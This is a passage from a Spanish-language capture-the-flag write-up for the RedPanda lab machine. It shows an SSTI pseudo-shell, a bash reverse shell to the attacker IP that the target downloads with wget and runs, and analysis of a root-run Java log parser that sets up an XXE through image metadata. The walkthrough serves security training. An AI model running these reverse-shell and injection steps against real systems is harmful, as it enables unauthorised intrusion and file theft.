</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            cmd <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>prompt(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> cmd <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;q&#39;</span>: <span style="color:#75715e"># Salir</span>
</span></span><span style="display:flex;"><span>                def_handler(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            ssti(cmd)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>De esta forma obtenemos una pseudo-consola a través del SSTI.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 ssti.py 
</span></span><span style="display:flex;"><span>&gt; whoami
</span></span><span style="display:flex;"><span>woodenk
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; ip a
</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc mq state UP group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether 00:50:56:94:46:df brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    inet 10.129.227.207/16 brd 10.129.255.255 scope global dynamic eth0
</span></span><span style="display:flex;"><span>       valid_lft 3560sec preferred_lft 3560sec
</span></span><span style="display:flex;"><span>    inet6 dead:beef::250:56ff:fe94:46df/64 scope global dynamic mngtmpaddr 
</span></span><span style="display:flex;"><span>       valid_lft 86399sec preferred_lft 14399sec
</span></span><span style="display:flex;"><span>    inet6 fe80::250:56ff:fe94:46df/64 scope link 
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt;
</span></span></code></pre></div><p>Podemos encontrar la flag en <code>/home/woodenk/user.txt</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; cat /home/woodenk/user.txt
</span></span><span style="display:flex;"><span>6abbc8d3fda37801....
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Como no hay otro usuario a parte de <code>root</code>, supongo que no habrá que hacer User Pivoting.</p>
<p>Antes de escalar, voy a mandarme una full tty.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#rev.sh</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.80/443 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; wget http://10.10.14.80:8081/rev.sh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; dir
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">883</span>  rev.sh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; chmod +x rev.sh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; ./rev.sh
</span></span></code></pre></div><p>Me llama la atención que estemos en un grupo llamado <code>logs</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>woodenk@redpanda:/tmp/hsperfdata_woodenk$ id   
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Encontramos un directorio <code>/credits</code> con unos archivos un tanto extraños</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;credits&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;author&gt;</span>damian<span style="color:#f92672">&lt;/author&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/angy.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/shy.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/crafty.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;image&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;uri&gt;</span>/img/peter.jpg<span style="color:#f92672">&lt;/uri&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;views&gt;</span>0<span style="color:#f92672">&lt;/views&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/image&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;totalviews&gt;</span>0<span style="color:#f92672">&lt;/totalviews&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/credits&gt;</span>
</span></span></code></pre></div><p>Pertenecen al grupo <code>logs</code></p>
<pre tabindex="0"><code>-rw-r-----  1 root logs  422 Jun 21  2022 damian_creds.xml
-rw-r-----  1 root logs  426 Jun 21  2022 woodenk_creds.xml
</code></pre><p>Encontramos un proyecto nuevo en Java, <code>LogParser</code>
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>El archivo main de este proyecto es el siguiente.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.logparser;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.BufferedWriter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileWriter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Scanner;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.imaging.jpeg.JpegMetadataReader;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.imaging.jpeg.JpegProcessingException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.metadata.Directory;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.metadata.Metadata;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.metadata.Tag;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.jdom2.JDOMException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.jdom2.input.SAXBuilder;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.jdom2.output.Format;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.jdom2.output.XMLOutputter;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.jdom2.*;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">App</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> strings <span style="color:#f92672">=</span> line.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\|\\|&#34;</span>);
</span></span><span style="display:flex;"><span>        Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;status_code&#34;</span>, Integer.<span style="color:#a6e22e">parseInt</span>(strings<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>));
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;ip&#34;</span>, strings<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;user_agent&#34;</span>, strings<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;uri&#34;</span>, strings<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> map;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(filename.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;.jpg&#34;</span>))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        String fullpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span style="color:#f92672">+</span> uri;
</span></span><span style="display:flex;"><span>        File jpgFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(fullpath);
</span></span><span style="display:flex;"><span>        Metadata metadata <span style="color:#f92672">=</span> JpegMetadataReader.<span style="color:#a6e22e">readMetadata</span>(jpgFile);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(Directory dir : metadata.<span style="color:#a6e22e">getDirectories</span>())
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span>(Tag tag : dir.<span style="color:#a6e22e">getTags</span>())
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(tag.<span style="color:#a6e22e">getTagName</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Artist&#34;</span>)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> tag.<span style="color:#a6e22e">getDescription</span>();
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;N/A&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        SAXBuilder saxBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
</span></span><span style="display:flex;"><span>        XMLOutputter xmlOutput <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XMLOutputter();
</span></span><span style="display:flex;"><span>        xmlOutput.<span style="color:#a6e22e">setFormat</span>(Format.<span style="color:#a6e22e">getPrettyFormat</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        File fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(path);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        Document doc <span style="color:#f92672">=</span> saxBuilder.<span style="color:#a6e22e">build</span>(fd);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        Element rootElement <span style="color:#f92672">=</span> doc.<span style="color:#a6e22e">getRootElement</span>();
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(Element el: rootElement.<span style="color:#a6e22e">getChildren</span>())
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(el.<span style="color:#a6e22e">getName</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;image&#34;</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(el.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;uri&#34;</span>).<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">equals</span>(uri))
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    Integer totalviews <span style="color:#f92672">=</span> Integer.<span style="color:#a6e22e">parseInt</span>(rootElement.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;totalviews&#34;</span>).<span style="color:#a6e22e">getText</span>()) <span style="color:#f92672">+</span> 1;
</span></span><span style="display:flex;"><span>                    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Total views:&#34;</span> <span style="color:#f92672">+</span> Integer.<span style="color:#a6e22e">toString</span>(totalviews));
</span></span><span style="display:flex;"><span>                    rootElement.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;totalviews&#34;</span>).<span style="color:#a6e22e">setText</span>(Integer.<span style="color:#a6e22e">toString</span>(totalviews));
</span></span><span style="display:flex;"><span>                    Integer views <span style="color:#f92672">=</span> Integer.<span style="color:#a6e22e">parseInt</span>(el.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;views&#34;</span>).<span style="color:#a6e22e">getText</span>());
</span></span><span style="display:flex;"><span>                    el.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;views&#34;</span>).<span style="color:#a6e22e">setText</span>(Integer.<span style="color:#a6e22e">toString</span>(views <span style="color:#f92672">+</span> 1));
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        BufferedWriter writer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedWriter(<span style="color:#66d9ef">new</span> FileWriter(fd));
</span></span><span style="display:flex;"><span>        xmlOutput.<span style="color:#a6e22e">output</span>(doc, writer);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> JDOMException, IOException, JpegProcessingException {
</span></span><span style="display:flex;"><span>        File log_fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(<span style="color:#e6db74">&#34;/opt/panda_search/redpanda.log&#34;</span>);
</span></span><span style="display:flex;"><span>        Scanner log_reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Scanner(log_fd);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(log_reader.<span style="color:#a6e22e">hasNextLine</span>())
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            String line <span style="color:#f92672">=</span> log_reader.<span style="color:#a6e22e">nextLine</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>isImage(line))
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            Map parsed_data <span style="color:#f92672">=</span> parseLog(line);
</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(parsed_data.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;uri&#34;</span>));
</span></span><span style="display:flex;"><span>            String artist <span style="color:#f92672">=</span> getArtist(parsed_data.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;uri&#34;</span>).<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Artist: &#34;</span> <span style="color:#f92672">+</span> artist);
</span></span><span style="display:flex;"><span>            String xmlPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/credits/&#34;</span> <span style="color:#f92672">+</span> artist <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_creds.xml&#34;</span>;
</span></span><span style="display:flex;"><span>            addViewTo(xmlPath, parsed_data.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;uri&#34;</span>).<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Vemos que se están almacenando logs en <code>/opt/panda_search_redpanda.log</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat redpanda.log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>404<span style="color:#f92672">||</span>10.10.14.80<span style="color:#f92672">||</span>Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:128.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/128.0<span style="color:#f92672">||</span>/cualquiera
</span></span><span style="display:flex;"><span>404<span style="color:#f92672">||</span>10.10.14.80<span style="color:#f92672">||</span>Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:128.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/128.0<span style="color:#f92672">||</span>/error
</span></span></code></pre></div><p>Lee el campo <code>Artist</code> de los metadatos de una imagen JPG que se almacena en <code>/opt/panda_search/src/main/resources/static</code>
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Luego crea un archivo XML representando varios campos
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>En el main, se utiliza el nombre extraido de los metadatos para crear una ruta <code>NOMBRE_creds.xml</code>, que pasa al método <code>addViewTo</code></p>
<p>Luego <code>addViewTo</code> parsea el XML, incrementando las visitas relacionadas con el autor de dicha imagen y escribe el archivo de vuelta.
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Detalle de la aplicación:</p>
<ol>
<li>
<p><strong>Método <code>parseLog(String line)</code></strong>:</p>
<ul>
<li><strong>Función</strong>: Divide una línea de registro en partes usando el delimitador <code>||</code> y almacena los valores en un <code>Map</code>.</li>
<li><strong>Contenido del <code>Map</code></strong>:
<ul>
<li><code>&quot;status_code&quot;</code>: Código de estado (entero).</li>
<li><code>&quot;ip&quot;</code>: Dirección IP.</li>
<li><code>&quot;user_agent&quot;</code>: Agente de usuario.</li>
<li><code>&quot;uri&quot;</code>: URI del recurso.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Método <code>isImage(String filename)</code></strong>:</p>
<ul>
<li><strong>Función</strong>: Verifica si el archivo tiene una extensión <code>.jpg</code>. Retorna <code>true</code> si es una imagen JPEG, <code>false</code> de lo contrario.</li>
</ul>
</li>
<li>
<p><strong>Método <code>getArtist(String uri)</code></strong>:</p>
<ul>
<li><strong>Función</strong>: Lee los metadatos EXIF de una imagen JPEG y busca el nombre del artista en los datos.</li>
<li><strong>Ruta del archivo</strong>: Construye la ruta del archivo utilizando el URI proporcionado y lee el archivo JPEG.</li>
<li><strong>Retorno</strong>: Devuelve el nombre del artista si se encuentra, o <code>&quot;N/A&quot;</code> si no se encuentra el campo de artista.</li>
</ul>
</li>
<li>
<p><strong>Método <code>addViewTo(String path, String uri)</code></strong>:</p>
<ul>
<li><strong>Función</strong>: Actualiza el contador de visualizaciones en un archivo XML dado el URI de la imagen.</li>
<li><strong>Proceso</strong>:
<ul>
<li>Lee el archivo XML y lo analiza.</li>
<li>Busca el elemento <code>&lt;image&gt;</code> cuyo <code>&lt;uri&gt;</code> coincida con el URI proporcionado.</li>
<li>Incrementa el conteo de visualizaciones para esa imagen y para el total de visualizaciones.</li>
<li>Escribe los cambios de vuelta al archivo XML.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Método <code>main(String[] args)</code></strong>:</p>
<ul>
<li><strong>Función</strong>: El punto de entrada del programa.</li>
<li><strong>Proceso</strong>:
<ul>
<li>Lee el archivo de registro (<code>redpanda.log</code>).</li>
<li>Procesa cada línea para determinar si corresponde a una imagen.</li>
<li>Si es una imagen, extrae la URI y busca el nombre del artista.</li>
<li>Actualiza el archivo XML correspondiente al artista con el nuevo conteo de visualizaciones.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="ejecución-y-flujo-de-datos">Ejecución y Flujo de Datos</h3>
<ol>
<li>
<p><strong>Lectura del Log</strong>: Se lee línea por línea desde <code>redpanda.log</code>. Cada línea es analizada para extraer detalles como el URI de la imagen.</p>
</li>
<li>
<p><strong>Verificación de Imagen</strong>: Se verifica si el URI corresponde a un archivo JPEG.</p>
</li>
<li>
<p><strong>Extracción de Artista</strong>: Si es una imagen, se obtiene el nombre del artista desde los metadatos EXIF de la imagen.</p>
</li>
<li>
<p><strong>Actualización del XML</strong>: Se actualiza el archivo XML asociado con el artista para reflejar el nuevo número de visualizaciones de la imagen.</p>
</li>
</ol>
<p>Como nosotros controlamos el campo <code>Artist</code> de la imagen, podríamos realizar un <code>XXE</code>, pero claro, de nada me sirve si <code>root</code> no ejecuta este script.</p>
<p>Y como me esperaba, hay una tarea CRON que ejecuta <code>root</code> donde cada X tiempo se ejecuta este archivo .jar
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Recapitulado, necesito que al método <code>addViewTo</code> se pase un archivo que yo controlo, así podría acontecer un XXE y leer archivo como <code>root</code>.</p>
<p>Para controlar la ruta al archivo XML, necesito control del campo <code>Artist</code> de los metadatos de algún JPG asociado.</p>
<p>Bien, primero vamos a coger el archivo <code>export.xml</code> y nos lo vamos a guardar para añadir el payload para cargar <code>/etc/passwd</code> para hacer esta PoC.</p>
<p>Esto no lo he añadido, pero este <code>export.xml</code> viene de la aplicación web.
Del archivo <code>MainController.java</code></p>
<p>Tiene este endpoint.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@GetMapping</span>(value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/export.xml&#34;</span>, produces <span style="color:#f92672">=</span> MediaType.<span style="color:#a6e22e">APPLICATION_OCTET_STREAM_VALUE</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">@ResponseBody</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">exportXML</span>(<span style="color:#a6e22e">@RequestParam</span>(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author&#34;</span>, defaultValue<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;err&#34;</span>) String author) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Exporting xml of: &#34;</span> <span style="color:#f92672">+</span> author);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(author.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;woodenk&#34;</span>) <span style="color:#f92672">||</span> author.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;damian&#34;</span>))
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			InputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;/credits/&#34;</span> <span style="color:#f92672">+</span> author <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_creds.xml&#34;</span>);
</span></span><span style="display:flex;"><span>			System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(in);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> IOUtils.<span style="color:#a6e22e">toByteArray</span>(in);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> IOUtils.<span style="color:#a6e22e">toByteArray</span>(<span style="color:#e6db74">&#34;Error, incorrect paramenter &#39;author&#39;\n\r&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://10.129.227.207:8080/export.xml?author<span style="color:#f92672">=</span>woodenk &gt; export.xml
</span></span></code></pre></div><p>Introducimos el típico payload XXE.
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Ahora nos tenemos que descargar alguna de las imagenes para modificar los metadatos.</p>
